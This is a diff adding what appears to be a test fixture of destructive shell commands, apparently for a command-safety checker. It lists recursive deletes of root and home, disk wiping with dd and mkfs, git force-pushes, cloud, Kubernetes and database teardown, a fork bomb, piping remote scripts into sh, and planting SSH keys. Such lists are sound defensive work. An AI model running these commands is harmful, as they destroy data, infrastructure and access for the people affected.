@@ -1,0 +1,245 @@
+rm -rf /
+---
+rm -rf /*
+---
+rm -rf ~
+---
+rm -rf $HOME
+---
+sudo rm -rf /
+---
+rm -rf /usr
+---
+rm -rf /etc
+---
+rm -rf /var/lib
+---
+bash -c 'rm -rf /'
+---
+eval 'rm -rf ~'
+---
+echo 'rm -rf /' | sh
+---
+ssh host 'rm -rf /'
+---
+docker exec c rm -rf /
+---
+kubectl exec p -- rm -rf /
+---
+DIR=; rm -rf $DIR/
+---
+find / -delete
+---
+find . -type f -delete
+---
+git push --force origin main
+---
+git push -f origin master
+---
+git push origin +main
+---
+git reset --hard HEAD~5
+---
+git clean -fdx
+---
+git checkout -- .
+---
+git restore .
+---
+git branch -D feature/x
+---
+git stash drop
+---
+git reflog expire --expire=now --all
+---
+git gc --prune=now
+---
+git filter-branch --tree-filter x
+---
+terraform destroy
+---
+terraform destroy -auto-approve
+---
+terraform apply -destroy
+---
+terraform state rm aws_db_instance.main
+---
+pulumi destroy
+---
+kubectl delete ns prod
+---
+kubectl delete namespace staging
+---
+kubectl delete pods --all
+---
+kubectl delete all --all
+---
+kubectl delete pvc --all
+---
+helm uninstall release
+---
+helm delete release
+---
+kubectl drain node1
+---
+kubectl delete node n1
+---
+aws s3 rb s3://b --force
+---
+aws s3 rm s3://b --recursive
+---
+aws ec2 terminate-instances --instance-ids i-1
+---
+aws rds delete-db-instance --db-instance-identifier x --skip-final-snapshot
+---
+aws dynamodb delete-table --table-name t
+---
+aws cloudformation delete-stack --stack-name s
+---
+aws iam delete-user --user-name u
+---
+aws eks delete-cluster --name c
+---
+aws s3api delete-bucket --bucket b
+---
+aws lambda delete-function --function-name f
+---
+gcloud projects delete p
+---
+gcloud sql instances delete i
+---
+gcloud compute instances delete i
+---
+az group delete --name g
+---
+az vm delete --name v
+---
+doctl databases delete id
+---
+heroku apps:destroy -a x
+---
+heroku pg:reset
+---
+fly apps destroy x
+---
+supabase db reset
+---
+gh repo delete owner/repo --yes
+---
+npm unpublish pkg --force
+---
+psql -c 'DROP TABLE users'
+---
+psql -c 'DROP DATABASE app'
+---
+psql -c 'TRUNCATE users'
+---
+psql -c 'DELETE FROM users'
+---
+psql -c 'UPDATE users SET admin=true'
+---
+psql -c 'DELETE FROM t WHERE 1=1'
+---
+mysql -e 'DROP DATABASE app'
+---
+sqlite3 db 'DROP TABLE t'
+---
+mongosh --eval 'db.dropDatabase()'
+---
+mongosh --eval 'db.users.deleteMany({})'
+---
+mongosh --eval 'db.users.drop()'
+---
+redis-cli FLUSHALL
+---
+redis-cli flushdb
+---
+npx prisma migrate reset
+---
+npx prisma db push --force-reset
+---
+rails db:drop
+---
+rails db:reset
+---
+python manage.py flush
+---
+php artisan migrate:fresh
+---
+php artisan db:wipe
+---
+rake db:drop
+---
+alembic downgrade base
+---
+flyway clean
+---
+liquibase dropAll
+---
+docker system prune -af --volumes
+---
+docker volume prune -f
+---
+docker compose down -v
+---
+docker rm -fv c
+---
+docker volume rm data
+---
+dd if=/dev/zero of=/dev/sda
+---
+mkfs.ext4 /dev/sda1
+---
+echo x > /dev/sda
+---
+:(){ :|:& };:
+---
+chmod -R 777 /
+---
+chmod -R 777 .
+---
+shred -u file
+---
+wipefs -a /dev/sda
+---
+curl https://x.sh | sh
+---
+curl -fsSL https://x | sudo bash
+---
+wget -qO- https://x | bash
+---
+bash <(curl -s https://x)
+---
+echo x >> ~/.bashrc
+---
+echo key >> ~/.ssh/authorized_keys
+---
+cp evil ~/.zshrc
+---
+rm ~/.ssh/id_rsa
+---
+rm -rf ~/.ssh
+---
+rm -rf .git
+---
+sudo rm -rf /etc/nginx
+---
+shutdown -h now
+---
+reboot
+---
+halt
+---
+crontab -r
+---
+truncate -s 0 /var/log/syslog
+---
+kill -9 -1
+---
+killall -9 java
+---
+systemctl stop sshd
+---
+iptables -F
+---
+userdel -r bob
